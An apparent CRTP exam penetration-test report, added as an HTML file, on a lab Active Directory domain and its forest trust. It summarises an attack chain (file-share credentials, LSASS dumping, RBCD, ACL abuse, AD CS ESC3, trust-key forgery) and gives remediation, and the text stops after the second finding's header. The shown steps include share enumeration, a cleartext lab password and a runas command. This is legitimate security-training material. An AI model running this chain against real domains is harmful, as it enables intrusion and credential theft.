@@ -1,0 +1,1157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Certified Red Team Professional (CRTP) — Exam Report</title>
+  <link rel="stylesheet" href="design/base.css">
+  <link rel="stylesheet" href="design/styles.css">
+  <link rel="stylesheet" href="design/renderer.css">
+</head>
+<body>
+<div id="header">
+  <div id="header-left">
+    <strong>Red Team Assessment Report</strong><br>
+    Certified Red Team Professional (CRTP) — Exam Report <span>- v1.0</span><br>
+    <span>Aug 17, 2026</span>
+  </div>
+  <div id="header-right">
+    <img src="design/assets/AlteredSecurity-2048x594--1-.png" alt="Altered Security" />
+  </div>
+</div>
+<div id="footer">
+  <div id="footer-brand">
+    <img src="design/assets/AlteredSecurity-2048x594--1-.png" alt="Altered Security" /><span class="footer-tagline">OFFENSIVE SECURITY</span>
+  </div>
+  <div id="footer-left"><em>CONFIDENTIAL</em></div>
+  <div id="footer-center">Certified Red Team Professional (CRTP) — Exam Report</div>
+</div>
+<section id="page-cover">
+  <div class="cover-photo"><img src="design/assets/thomas-wiese-spartan-fusion.png" alt="" /></div>
+  <svg class="cover-shape" viewBox="0 0 210 297" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
+    <polygon points="0,0 210,0 210,122 0,160" fill="#0C0054" fill-opacity="0.97" />
+    <polygon points="0,160 210,122 210,126 0,164" fill="#D2003C" />
+  </svg>
+  <div class="cover-panel">
+    <div class="cover-brand">
+      <img class="cover-logo" src="design/assets/AlteredSecurity-2048x594--1-.png" alt="Altered Security" /><span class="cover-divider"></span><span class="cover-tagline">OFFENSIVE SECURITY</span>
+    </div>
+    <div class="cover-title">
+      <h1>RED TEAM ASSESSMENT REPORT</h1>
+      <h2 class="cover-subtitle">Certified Red Team Professional (CRTP) — Exam Report</h2>
+    </div>
+    <div class="cover-meta">
+      <p class="cover-dateline">
+        <span>Aug 17, 2026</span><br>
+        <span>VERSION 1.0</span>
+      </p>
+      <p class="cover-customer"><strong>Altered Security — CRTP Exam Lab</strong></p>
+    </div>
+    <div class="cover-contact">
+      <p class="cover-contact-label">CONTACT</p>
+      <p class="cover-contact-person">
+        <strong>Student</strong><br>
+        <span>srqllabmya@gmail.com</span>
+      </p>
+    </div>
+  </div>
+</section>
+<pagebreak />
+<section id="toc">
+  <h1>Table of Contents</h1>
+  <ol>
+    <li class="toc-level1"><a href="#document-control" class="ref"><span>Document Control</span></a></li>
+    <li class="toc-level2"><a href="#team" class="ref"><span>Team</span></a></li>
+    <li class="toc-level2"><a href="#list-of-changes" class="ref"><span>List of Changes</span></a></li>
+    <li class="toc-level1"><a href="#executive-summary" class="ref"><span>Executive Summary</span></a></li>
+    <li class="toc-level2"><a href="#executive-summary-overview" class="ref"><span>Summary</span></a></li>
+    <li class="toc-level2"><a href="#finding-summary" class="ref"><span>Identified Misconfigurations</span></a></li>
+    <li class="toc-level2"><a href="#recommendations-summary" class="ref"><span>Recommendations</span></a></li>
+    <li class="toc-level2"><a href="#conclusion" class="ref"><span>Conclusion</span></a></li>
+    <li class="toc-level1"><a href="#methodology" class="ref"><span>Methodology</span></a></li>
+    <li class="toc-level2"><a href="#objective" class="ref"><span>Objective</span></a></li>
+    <li class="toc-level2"><a href="#scope" class="ref"><span>Scope</span></a></li>
+    <li class="toc-level2"><a href="#provided-users" class="ref"><span>Provided User Account and Machine</span></a></li>
+    <li class="toc-level1"><a href="#findings" class="ref"><span>Compromission Path</span></a></li>
+    <li class="toc-level2"><a href="#f-1-initial-foothold-cleartext-credentials-in-a-file-share" class="ref"><span>F-1 · Initial Foothold — Cleartext Credentials in a File Share</span></a></li>
+    <li class="toc-level2"><a href="#f-2-local-privilege-escalation-lsass-credential-theft" class="ref"><span>F-2 · Local Privilege Escalation &amp; LSASS Credential Theft</span></a></li>
+    <li class="toc-level2"><a href="#f-3-domain-reconnaissance-attack-path-discovery" class="ref"><span>F-3 · Domain Reconnaissance &amp; Attack-Path Discovery</span></a></li>
+    <li class="toc-level2"><a href="#f-4-resource-based-constrained-delegation-rbcd-mgmtsrv" class="ref"><span>F-4 · Resource-Based Constrained Delegation (RBCD) → MGMTSRV</span></a></li>
+    <li class="toc-level2"><a href="#f-5-active-directory-acl-abuse-addself-force-change-password" class="ref"><span>F-5 · Active Directory ACL Abuse — AddSelf &amp; Force-Change-Password</span></a></li>
+    <li class="toc-level2"><a href="#f-6-lateral-movement-to-techsrv30-local-secret-extraction" class="ref"><span>F-6 · Lateral Movement to TECHSRV30 &amp; Local Secret Extraction</span></a></li>
+    <li class="toc-level2"><a href="#f-7-lsa-secrets-harvest-causer-adminsrv86" class="ref"><span>F-7 · LSA Secrets Harvest — `causer` &amp; ADMINSRV86</span></a></li>
+    <li class="toc-level2"><a href="#f-8-ad-cs-esc3-enrollment-agent-abuse-to-domain-admin" class="ref"><span>F-8 · AD CS ESC3 — Enrollment-Agent Abuse to Domain Admin</span></a></li>
+    <li class="toc-level2"><a href="#f-9-cross-forest-compromise-trust-key-forgery-into-finance-corp" class="ref"><span>F-9 · Cross-Forest Compromise — Trust-Key Forgery into finance.corp</span></a></li>
+    <li class="toc-level1"><a href="#disclaimer" class="ref"><span>Disclaimer</span></a></li>
+    <li class="toc-level1"><a href="#appendix" class="ref"><span>Appendix</span></a></li>
+    <li class="toc-level2"><a href="#compromised-credentials-secrets" class="ref"><span>Compromised Credentials &amp; Secrets</span></a></li>
+    <li class="toc-level2"><a href="#key-domain-facts" class="ref"><span>Key Domain Facts</span></a></li>
+    <li class="toc-level2"><a href="#tooling" class="ref"><span>Tooling</span></a></li>
+    <li class="toc-level2"><a href="#remediation-checklist" class="ref"><span>Remediation Checklist</span></a></li>
+  </ol>
+</section>
+<pagebreak />
+<section id="lof">
+  <h1>List of Figures</h1>
+  <ul>
+    <li><a href="#figure-1" class="ref ref-figure"><span class="ref-title">The maintenance share and the backup script it exposes</span></a></li>
+    <li><a href="#figure-2" class="ref ref-figure"><span class="ref-title">Cleartext studentadmin password inside the backup script</span></a></li>
+    <li><a href="#figure-3" class="ref ref-figure"><span class="ref-title">runas as the recovered studentadmin account</span></a></li>
+    <li><a href="#figure-4" class="ref ref-figure"><span class="ref-title">Defender real-time monitoring disabled</span></a></li>
+    <li><a href="#figure-5" class="ref ref-figure"><span class="ref-title">STUDVM$ machine-account NTLM hash recovered from LSASS</span></a></li>
+    <li><a href="#figure-6" class="ref ref-figure"><span class="ref-title">Forest trust to finance.corp discovered by adPEAS</span></a></li>
+    <li><a href="#figure-7" class="ref ref-figure"><span class="ref-title">Configuring Resource-Based Constrained Delegation on MGMTSRV</span></a></li>
+    <li><a href="#figure-8" class="ref ref-figure"><span class="ref-title">techservice credentials recovered from MGMTSRV</span></a></li>
+    <li><a href="#figure-9" class="ref ref-figure"><span class="ref-title">Management group holds Force-Change-Password over puretech</span></a></li>
+    <li><a href="#figure-10" class="ref ref-figure"><span class="ref-title">Self-adding techservice into the privileged Management group</span></a></li>
+    <li><a href="#figure-11" class="ref ref-figure"><span class="ref-title">Force-resetting the puretech account password</span></a></li>
+    <li><a href="#figure-12" class="ref ref-figure"><span class="ref-title">Interactive session as puretech</span></a></li>
+    <li><a href="#figure-13" class="ref ref-figure"><span class="ref-title">SAM dump on TECHSRV30 exposing the local admin securetech</span></a></li>
+    <li><a href="#figure-14" class="ref ref-figure"><span class="ref-title">Requesting the FIDO enrollment-agent certificate as causer</span></a></li>
+    <li><a href="#figure-15" class="ref ref-figure"><span class="ref-title">Domain Admin (techadmin) TGT obtained via PKINIT</span></a></li>
+    <li><a href="#figure-16" class="ref ref-figure"><span class="ref-title">PKINIT TGT verified and OS command execution on FINANCE-DC as finadmin</span></a></li>
+    <li><a href="#figure-17" class="ref ref-figure"><span class="ref-title">Final objective flag read on FINANCE-DC as finadmin</span></a></li>
+  </ul>
+</section>
+<pagebreak />
+<section>
+  <h1 id="document-control" class="in-toc numbered">Document Control</h1>
+  <div>
+    <h2 id="team" class="in-toc numbered">Team</h2>
+    <table class="tbl-plain">
+      <tr><th>Contact</th><th>Details</th><th>Role</th></tr>
+      <tr><td>Student</td><td>E-Mail: srqllabmya@gmail.com</td><td>Lead Pentester, Red Team Operator</td></tr>
+    </table>
+  </div>
+  <div>
+    <h2 id="list-of-changes" class="in-toc numbered">List of Changes</h2>
+    <table class="tbl-plain">
+      <tr><th>Version</th><th>Description</th><th>Date</th></tr>
+      <tr><td>0.1</td><td>Initial draft — attack path captured</td><td>Aug 16, 2026</td></tr>
+      <tr><td>1.0</td><td>Final version — narrative, evidence and remediation completed</td><td>Aug 17, 2026</td></tr>
+    </table>
+  </div>
+</section>
+<pagebreak />
+<section>
+  <h1 id="executive-summary" class="in-toc numbered">Executive Summary</h1>
+  <div>
+    <h2 id="executive-summary-overview" class="in-toc numbered">Summary</h2>
+<p>This report documents a full red team assessment of the <strong><code>tech.corp</code></strong>
+Active Directory domain and its bidirectional forest trust with
+<strong><code>finance.corp</code></strong>, performed as part of the Certified Red Team
+Professional (CRTP) examination. Testing began from an assumed-breach
+position: a single low-privileged user, <code>tech\studentuser</code>, on the foothold
+workstation <strong>STUDVM</strong>. No exploit of unpatched software was used at any
+point — every step abused a legitimate Windows or Active Directory feature
+that had been left in an insecure configuration.</p>
+<p>From that starting point we obtained <strong>complete control of the <code>tech.corp</code>
+domain</strong> and then <strong>pivoted across the forest trust to compromise
+<code>finance.corp</code></strong>, retrieving the final objective flag from the desktop of a
+privileged account on the <code>finance.corp</code> domain controller. The compromise
+was achieved by chaining the following weaknesses, each ordinary on its own
+but devastating in sequence:</p>
+<ul>
+<li><strong>Cleartext credentials in a readable file share</strong> gave the first
+  privilege escalation on the foothold host.</li>
+<li><strong>No LAPS and reused local administrator rights</strong> allowed credential theft
+  from LSASS and lateral movement between member servers.</li>
+<li><strong>Resource-Based Constrained Delegation (RBCD)</strong> that a machine account
+  could configure on itself let us impersonate a Domain Admin to a
+  management server.</li>
+<li><strong>Dangerous Active Directory ACLs</strong> (self-membership into a privileged
+  group, and force-password-reset rights over another user) extended access
+  without ever cracking a password.</li>
+<li><strong>An Active Directory Certificate Services misconfiguration (ESC3)</strong> turned
+  a low-privileged certificate enrollment right into a Domain Admin logon.</li>
+<li><strong>A forest trust without effective SID filtering on the outbound path</strong>
+  allowed a forged inter-realm ticket to be honoured by <code>finance.corp</code>.</li>
+</ul>
+<p>Overall posture is assessed as <strong>Critical</strong>. A single foothold credential was
+sufficient to reach Enterprise Admin in <code>tech.corp</code> and to cross the trust
+boundary into a second forest. The remediation section prioritises the
+changes that break the <em>earliest</em> links in this chain, because doing so
+collapses everything downstream of them.</p>
+  </div>
+  <div>
+    <h2 id="finding-summary" class="in-toc numbered">Identified Misconfigurations</h2>
+    <table class="tbl-summary">
+      <thead><tr><th>Name</th><th>Affected Components</th><th class="col-page">Page</th></tr></thead>
+      <tbody>
+        <tr class="table-row-link-recommendation"><td><a class="ref" href="#f-1-initial-foothold-cleartext-credentials-in-a-file-share">F-1 · Initial Foothold — Cleartext Credentials in a File Share</a></td><td><a class="ref" href="#f-1-initial-foothold-cleartext-credentials-in-a-file-share">STUDVM</a></td><td class="col-page"><a class="ref ref-page" href="#f-1-initial-foothold-cleartext-credentials-in-a-file-share"></a></td></tr>
+        <tr class="table-row-link-recommendation"><td><a class="ref" href="#f-2-local-privilege-escalation-lsass-credential-theft">F-2 · Local Privilege Escalation &amp; LSASS Credential Theft</a></td><td><a class="ref" href="#f-2-local-privilege-escalation-lsass-credential-theft">STUDVM</a></td><td class="col-page"><a class="ref ref-page" href="#f-2-local-privilege-escalation-lsass-credential-theft"></a></td></tr>
+        <tr class="table-row-link-recommendation"><td><a class="ref" href="#f-3-domain-reconnaissance-attack-path-discovery">F-3 · Domain Reconnaissance &amp; Attack-Path Discovery</a></td><td><a class="ref" href="#f-3-domain-reconnaissance-attack-path-discovery">tech.corp (domain-wide)</a></td><td class="col-page"><a class="ref ref-page" href="#f-3-domain-reconnaissance-attack-path-discovery"></a></td></tr>
+        <tr class="table-row-link-recommendation"><td><a class="ref" href="#f-4-resource-based-constrained-delegation-rbcd-mgmtsrv">F-4 · Resource-Based Constrained Delegation (RBCD) → MGMTSRV</a></td><td><a class="ref" href="#f-4-resource-based-constrained-delegation-rbcd-mgmtsrv">MGMTSRV</a></td><td class="col-page"><a class="ref ref-page" href="#f-4-resource-based-constrained-delegation-rbcd-mgmtsrv"></a></td></tr>
+        <tr class="table-row-link-recommendation"><td><a class="ref" href="#f-5-active-directory-acl-abuse-addself-force-change-password">F-5 · Active Directory ACL Abuse — AddSelf &amp; Force-Change-Password</a></td><td><a class="ref" href="#f-5-active-directory-acl-abuse-addself-force-change-password">tech.corp (Directory ACLs)</a></td><td class="col-page"><a class="ref ref-page" href="#f-5-active-directory-acl-abuse-addself-force-change-password"></a></td></tr>
+        <tr class="table-row-link-recommendation"><td><a class="ref" href="#f-6-lateral-movement-to-techsrv30-local-secret-extraction">F-6 · Lateral Movement to TECHSRV30 &amp; Local Secret Extraction</a></td><td><a class="ref" href="#f-6-lateral-movement-to-techsrv30-local-secret-extraction">TECHSRV30</a></td><td class="col-page"><a class="ref ref-page" href="#f-6-lateral-movement-to-techsrv30-local-secret-extraction"></a></td></tr>
+        <tr class="table-row-link-recommendation"><td><a class="ref" href="#f-7-lsa-secrets-harvest-causer-adminsrv86">F-7 · LSA Secrets Harvest — `causer` &amp; ADMINSRV86</a></td><td><a class="ref" href="#f-7-lsa-secrets-harvest-causer-adminsrv86">ADMINSRV86</a></td><td class="col-page"><a class="ref ref-page" href="#f-7-lsa-secrets-harvest-causer-adminsrv86"></a></td></tr>
+        <tr class="table-row-link-recommendation"><td><a class="ref" href="#f-8-ad-cs-esc3-enrollment-agent-abuse-to-domain-admin">F-8 · AD CS ESC3 — Enrollment-Agent Abuse to Domain Admin</a></td><td><a class="ref" href="#f-8-ad-cs-esc3-enrollment-agent-abuse-to-domain-admin">TECH-DC (tech-tech-dc-CA)</a></td><td class="col-page"><a class="ref ref-page" href="#f-8-ad-cs-esc3-enrollment-agent-abuse-to-domain-admin"></a></td></tr>
+        <tr class="table-row-link-recommendation"><td><a class="ref" href="#f-9-cross-forest-compromise-trust-key-forgery-into-finance-corp">F-9 · Cross-Forest Compromise — Trust-Key Forgery into finance.corp</a></td><td><a class="ref" href="#f-9-cross-forest-compromise-trust-key-forgery-into-finance-corp">FINANCE-DC</a></td><td class="col-page"><a class="ref ref-page" href="#f-9-cross-forest-compromise-trust-key-forgery-into-finance-corp"></a></td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div>
+    <h2 id="recommendations-summary" class="in-toc numbered">Recommendations</h2>
+    <table class="tbl-reco">
+      <thead><tr><th style="width: 150px;">Name</th><th>Details</th></tr></thead>
+      <tbody>
+        <tr class="table-row-link"><td><a class="ref" href="#f-1-initial-foothold-cleartext-credentials-in-a-file-share">F-1 · Initial Foothold — Cleartext Credentials in a File Share</a></td><td><a class="ref" href="#f-1-initial-foothold-cleartext-credentials-in-a-file-share"><ul>
+<li><strong>Never store credentials in scripts</strong> on file shares. Move the backup
+  job to a <strong>Group Managed Service Account (gMSA)</strong> whose password is
+  machine-managed and never exposed.</li>
+<li>Restrict the <code>maintenance</code> share ACL to only the accounts that require it,
+  and audit SYSVOL/NETLOGON and custom shares for embedded secrets.</li>
+<li>Rotate the <code>studentadmin</code> password immediately and enforce <strong>LAPS</strong> so the
+  local administrator password is unique per host.</li>
+</ul></a></td></tr>
+        <tr class="table-row-link"><td><a class="ref" href="#f-2-local-privilege-escalation-lsass-credential-theft">F-2 · Local Privilege Escalation &amp; LSASS Credential Theft</a></td><td><a class="ref" href="#f-2-local-privilege-escalation-lsass-credential-theft"><ul>
+<li>Deploy <strong>LAPS</strong> and <strong>Windows Defender Credential Guard</strong> to protect LSASS
+  secrets and prevent machine/domain credential reuse.</li>
+<li>Alert on <strong>Defender tamper events</strong> (real-time protection being disabled)
+  and on local-administrators group membership changes.</li>
+<li>Place high-value accounts in the <strong>Protected Users</strong> group and enforce a
+  tiered administration model.</li>
+</ul></a></td></tr>
+        <tr class="table-row-link"><td><a class="ref" href="#f-3-domain-reconnaissance-attack-path-discovery">F-3 · Domain Reconnaissance &amp; Attack-Path Discovery</a></td><td><a class="ref" href="#f-3-domain-reconnaissance-attack-path-discovery"><ul>
+<li>Lower <code>ms-DS-MachineAccountQuota</code> to <strong>0</strong> so standard users cannot create
+  computer accounts (a prerequisite for several delegation attacks).</li>
+<li>Deploy LAPS, add Tier-0 accounts to <strong>Protected Users</strong>, and review AD CS
+  template permissions (see F-8).</li>
+<li>Monitor for enumeration tooling (LDAP-heavy queries, SharpHound
+  collection patterns).</li>
+</ul></a></td></tr>
+        <tr class="table-row-link"><td><a class="ref" href="#f-4-resource-based-constrained-delegation-rbcd-mgmtsrv">F-4 · Resource-Based Constrained Delegation (RBCD) → MGMTSRV</a></td><td><a class="ref" href="#f-4-resource-based-constrained-delegation-rbcd-mgmtsrv"><ul>
+<li>Audit and remove write access to <strong><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></strong>
+  for non-administrative principals; no standard machine account should be
+  able to configure delegation on another host.</li>
+<li>Set <code>ms-DS-MachineAccountQuota</code> to 0 and mark Tier-0 accounts as
+  <strong>sensitive and cannot be delegated</strong>.</li>
+<li>Monitor Event ID 4769 for S4U ticket requests referencing privileged
+  users.</li>
+</ul></a></td></tr>
+        <tr class="table-row-link"><td><a class="ref" href="#f-5-active-directory-acl-abuse-addself-force-change-password">F-5 · Active Directory ACL Abuse — AddSelf &amp; Force-Change-Password</a></td><td><a class="ref" href="#f-5-active-directory-acl-abuse-addself-force-change-password"><ul>
+<li>Remove the <strong>Self-Membership</strong> ACE that lets <code>techservice</code> add itself to
+  <code>Management</code>, and the <strong>User-Force-Change-Password</strong> right the group holds
+  over <code>puretech</code>; grant such rights only to dedicated, monitored admin
+  roles.</li>
+<li>Run regular ACL reviews (BloodHound / <code>Get-DomainObjectAcl</code>) to catch
+  privilege-granting ACEs on users and groups.</li>
+<li>Alert on Event ID 4724/4738 (password reset / account change) for
+  sensitive accounts.</li>
+</ul></a></td></tr>
+        <tr class="table-row-link"><td><a class="ref" href="#f-6-lateral-movement-to-techsrv30-local-secret-extraction">F-6 · Lateral Movement to TECHSRV30 &amp; Local Secret Extraction</a></td><td><a class="ref" href="#f-6-lateral-movement-to-techsrv30-local-secret-extraction"><ul>
+<li>Deploy <strong>LAPS</strong> to eliminate shared local-administrator passwords across
+  member servers.</li>
+<li>Restrict who holds local administrator rights on application servers;
+  apply the tiered administration model.</li>
+<li>Enable <strong>Credential Guard</strong> and monitor for SAM/LSA dumping (Event ID
+  4688 with suspicious process lineage).</li>
+</ul></a></td></tr>
+        <tr class="table-row-link"><td><a class="ref" href="#f-7-lsa-secrets-harvest-causer-adminsrv86">F-7 · LSA Secrets Harvest — `causer` &amp; ADMINSRV86</a></td><td><a class="ref" href="#f-7-lsa-secrets-harvest-causer-adminsrv86"><ul>
+<li>Avoid running services under domain user accounts with static passwords;
+  migrate <code>SNMPTRAP</code> and similar services to <strong>gMSA</strong>.</li>
+<li>Restrict local administrator access so LSA secrets cannot be read, and
+  enable <strong>Credential Guard</strong>.</li>
+<li>Rotate the <code>causer</code> password and review its certificate-enrollment rights
+  (see F-8).</li>
+</ul></a></td></tr>
+        <tr class="table-row-link"><td><a class="ref" href="#f-8-ad-cs-esc3-enrollment-agent-abuse-to-domain-admin">F-8 · AD CS ESC3 — Enrollment-Agent Abuse to Domain Admin</a></td><td><a class="ref" href="#f-8-ad-cs-esc3-enrollment-agent-abuse-to-domain-admin"><ul>
+<li>Remove the <strong>Certificate Request Agent</strong> EKU from the <code>FIDO</code> template, or
+  restrict enrollment to a small, trusted group and require <strong>CA manager
+  approval</strong> for issuance.</li>
+<li>Restrict the <code>FIDOUsers</code> template so enrollment agents cannot request on
+  behalf of Tier-0 accounts; enable the <strong>enrollment-agent restrictions</strong>
+  on the CA.</li>
+<li>Monitor for <code>Certify</code>/certificate-request activity and PKINIT logons for
+  privileged users.</li>
+</ul></a></td></tr>
+        <tr class="table-row-link"><td><a class="ref" href="#f-9-cross-forest-compromise-trust-key-forgery-into-finance-corp">F-9 · Cross-Forest Compromise — Trust-Key Forgery into finance.corp</a></td><td><a class="ref" href="#f-9-cross-forest-compromise-trust-key-forgery-into-finance-corp"><ul>
+<li><strong>Enforce SID filtering / selective authentication</strong> on the <code>finance.corp</code>
+  trust in <em>both</em> directions so that forged inter-realm tickets — even those
+  impersonating native RID 500 accounts — cannot cross the boundary.</li>
+<li>Treat the <strong>forest</strong>, not the domain, as the security boundary; keep
+  highly sensitive assets in a separate, tightly-trusted forest.</li>
+<li><strong>Never store unencrypted private keys</strong> on file shares; the exposed
+  <code>finadmin.pem</code> gave a direct certificate-based logon. Protect private keys
+  with strong passphrases and restrictive ACLs.</li>
+<li>Rotate the <strong><code>krbtgt</code></strong> account (twice) and the <strong>inter-realm trust key</strong>;
+  monitor for anomalous inter-realm TGS requests.</li>
+</ul></a></td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div>
+    <h2 id="conclusion" class="in-toc numbered">Conclusion</h2>
+<p>The <code>tech.corp</code> domain can be fully compromised by any attacker who obtains a
+single standard domain credential, and that compromise does not stop at the
+domain boundary — it extends across the forest trust into <code>finance.corp</code>. The
+path required no software vulnerability; it was made possible entirely by
+identity, delegation, certificate-services and trust misconfigurations.</p>
+<p>Remediation should be sequenced by attack-path impact rather than by treating
+each finding in isolation:</p>
+<ol>
+<li><strong>Remove secrets from file shares and deploy LAPS</strong> — this eliminates the
+   initial foothold escalation and the credential reuse that followed it.</li>
+<li><strong>Audit and remove dangerous delegation and ACLs</strong> — RBCD write rights,
+   self-membership and force-password-reset ACEs on privileged objects were
+   the backbone of the domain takeover.</li>
+<li><strong>Harden AD CS</strong> — remove the ESC3 enrollment-agent capability and enforce
+   manager approval; this closes the certificate path to Domain Admin.</li>
+<li><strong>Enforce SID filtering / quarantine on the forest trust</strong> — this is the
+   control that would have stopped the cross-forest pivot.</li>
+</ol>
+<p>Applying items 1 and 2 alone would have halted this assessment before Domain
+Admin was reached. They should be treated as immediate priorities.</p>
+  </div>
+</section>
+<pagebreak />
+<section>
+  <h1 id="methodology" class="in-toc numbered">Methodology</h1>
+<figure><img alt="" src="design/assets/methodology.png" width="auto"></figure>
+<p>The assessment followed an assumed-breach methodology aligned with the MITRE
+ATT&amp;CK framework. Beginning with the credentials of a single low-privileged
+domain user, testing progressed through the following phases:</p>
+<ul>
+<li><strong>Reconnaissance &amp; Enumeration</strong> — mapping users, groups, computers, ACLs,
+  certificate templates, delegation and trusts using adPEAS, PowerView and
+  BloodHound.</li>
+<li><strong>Privilege Escalation</strong> — abusing file-share secrets, delegation (RBCD),
+  dangerous ACLs and AD CS (ESC3).</li>
+<li><strong>Credential Access</strong> — extracting secrets from LSASS, the SAM and LSA
+  secrets with an evasive build of Mimikatz.</li>
+<li><strong>Lateral Movement</strong> — replaying harvested hashes and Kerberos tickets
+  across hosts (Over-Pass-the-Hash, S4U, Pass-the-Ticket).</li>
+<li><strong>Domain &amp; Forest Dominance</strong> — reaching Domain / Enterprise Admin in
+  <code>tech.corp</code> and pivoting across the trust into <code>finance.corp</code>.</li>
+</ul>
+  <h2 id="objective" class="in-toc numbered">Objective</h2>
+<p>The goal of the assessment was to identify and exploit misconfigurations in
+the environment, assuming all hosts carry current security patches and that
+Microsoft Defender is enabled. For each machine in scope the objective was to
+obtain and prove operating-system-level command execution, and to document
+the complete path of compromise across the <code>tech.corp</code> domain and its trust
+with <code>finance.corp</code>.</p>
+<p><strong>Assessment goal:</strong> Compromise the machines in scope, prove OS-level command
+execution on each, and retrieve the final objective flag from <code>finance.corp</code>.</p>
+  <pagebreak />
+  <div>
+    <h2 id="scope" class="in-toc numbered">Scope</h2>
+    <p>As of <strong>Aug 16, 2026</strong>, the scope is defined as below:</p>
+<p><strong>Targeted Systems:</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Hostname</th>
+<th style="text-align: left;">IP</th>
+<th style="text-align: left;">Role</th>
+<th style="text-align: left;">Domain</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">STUDVM</td>
+<td style="text-align: left;">172.16.100.10</td>
+<td style="text-align: left;">Foothold workstation (assumed breach)</td>
+<td style="text-align: left;">tech.corp</td>
+</tr>
+<tr>
+<td style="text-align: left;">TECH-DC</td>
+<td style="text-align: left;">—</td>
+<td style="text-align: left;">Domain Controller / AD CS Certificate Authority</td>
+<td style="text-align: left;">tech.corp</td>
+</tr>
+<tr>
+<td style="text-align: left;">MGMTSRV</td>
+<td style="text-align: left;">—</td>
+<td style="text-align: left;">Management server (RBCD target)</td>
+<td style="text-align: left;">tech.corp</td>
+</tr>
+<tr>
+<td style="text-align: left;">TECHSRV30</td>
+<td style="text-align: left;">—</td>
+<td style="text-align: left;">Application server</td>
+<td style="text-align: left;">tech.corp</td>
+</tr>
+<tr>
+<td style="text-align: left;">ADMINSRV86</td>
+<td style="text-align: left;">—</td>
+<td style="text-align: left;">Administration server</td>
+<td style="text-align: left;">tech.corp</td>
+</tr>
+<tr>
+<td style="text-align: left;">FINANCE-DC</td>
+<td style="text-align: left;">172.16.3.4</td>
+<td style="text-align: left;">Forest-root Domain Controller</td>
+<td style="text-align: left;">finance.corp</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Forest trust:</strong> <code>tech.corp</code> ⇄ <code>finance.corp</code> — Bidirectional, Transitive,
+marked <code>QUARANTINED_DOMAIN</code> (SID filtering enabled on the trust).</p>
+  </div>
+  <div>
+    <h2 id="provided-users" class="in-toc numbered">Provided User Account and Machine</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">User Name</th>
+<th style="text-align: left;">Machine Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>tech\studentuser</code></td>
+<td style="text-align: left;">STUDVM</td>
+</tr>
+</tbody>
+</table>
+  </div>
+</section>
+<pagebreak />
+<section>
+  <h1 id="findings" class="in-toc numbered">Compromission Path</h1>
+  <div class="finding">
+    <table class="finding-header">
+      <tr><th colspan="2"><h2 id="f-1-initial-foothold-cleartext-credentials-in-a-file-share" class="in-toc numbered text-center">F-1 · Initial Foothold — Cleartext Credentials in a File Share</h2></th></tr>
+      <tr><td class="table-key">Hostname</td><td>STUDVM</td></tr>
+      <tr><td class="table-key">FQDN</td><td>studvm.tech.corp</td></tr>
+      <tr><td class="table-key">OS Details</td><td><p>Windows 10 (foothold workstation)</p></td></tr>
+      <tr><td class="table-key">IP Address</td><td>172.16.100.10</td></tr>
+    </table>
+    <h3>Description</h3>
+<p>Starting as the unprivileged user <code>tech\studentuser</code>, enumeration of
+accessible SMB shares revealed a non-default share named <strong><code>maintenance</code></strong>
+on the domain controller that was readable by standard users. It contained
+a PowerShell backup script, <code>Backup-ADSystemStateAndGPO.ps1</code>, in which the
+<strong>cleartext password of the local administrator account <code>studentadmin</code></strong>
+had been hard-coded. Storing credentials in a world-readable script is a
+classic operational mistake and it provided the first privilege
+escalation on the foothold host.</p>
+    <h3>Compromission Steps</h3>
+<p>Enumerate shares on the domain controller and open the unusual
+<code>maintenance</code> share:</p>
+<pre><code class="language-powershell">net view \\tech-dc.tech.corp
+# ... maintenance   Disk ...
+dir \\tech-dc.tech.corp\maintenance\
+#  Backup-ADSystemStateAndGPO.ps1
+</code></pre>
+<figure id="figure-1"><img alt="The maintenance share and the backup script it exposes" src="images/img15.png"><figcaption>The maintenance share and the backup script it exposes</figcaption></figure>
+<p>Reading the script reveals the hard-coded credentials for <code>studentadmin</code>:</p>
+<figure id="figure-2"><img alt="Cleartext studentadmin password inside the backup script" src="images/img16.png"><figcaption>Cleartext studentadmin password inside the backup script</figcaption></figure>
+<p>Authenticate as the recovered local administrator:</p>
+<pre><code class="language-text">Username : studentadmin
+Password : P@ssS3cretforuservirtualmachineAdm!nthatitisnotguessable!
+
+runas /user:studentadmin &quot;cmd.exe&quot;
+# Attempting to start cmd.exe as user &quot;studvm\studentadmin&quot; ...
+</code></pre>
+<figure id="figure-3"><img alt="runas as the recovered studentadmin account" src="images/img17.png"><figcaption>runas as the recovered studentadmin account</figcaption></figure>
+    <h3>Recommendations</h3>
+<ul>
+<li><strong>Never store credentials in scripts</strong> on file shares. Move the backup
+  job to a <strong>Group Managed Service Account (gMSA)</strong> whose password is
+  machine-managed and never exposed.</li>
+<li>Restrict the <code>maintenance</code> share ACL to only the accounts that require it,
+  and audit SYSVOL/NETLOGON and custom shares for embedded secrets.</li>
+<li>Rotate the <code>studentadmin</code> password immediately and enforce <strong>LAPS</strong> so the
+  local administrator password is unique per host.</li>
+</ul>
+    <h3>References</h3>
+    <div class="finding-references">
+      <ul>
+        <li><a href="https://attack.mitre.org/techniques/T1552/001/" target="_blank">https://attack.mitre.org/techniques/T1552/001/</a></li>
+        <li><a href="https://learn.microsoft.com/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview" target="_blank">https://learn.microsoft.com/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview</a></li>
+      </ul>
+    </div>
+    <pagebreak />
+  </div>
+  <div class="finding">
+    <table class="finding-header">
+      <tr><th colspan="2"><h2 id="f-2-local-privilege-escalation-lsass-credential-theft" class="in-toc numbered text-center">F-2 · Local Privilege Escalation &amp; LSASS Credential Theft</h2></th></tr>
+      <tr><td class="table-key">Hostname</td><td>STUDVM</td></tr>
+      <tr><td class="table-key">FQDN</td><td>studvm.tech.corp</td></tr>
+      <tr><td class="table-key">OS Details</td><td><p>Windows 10 (foothold workstation)</p></td></tr>
+      <tr><td class="table-key">IP Address</td><td>172.16.100.10</td></tr>
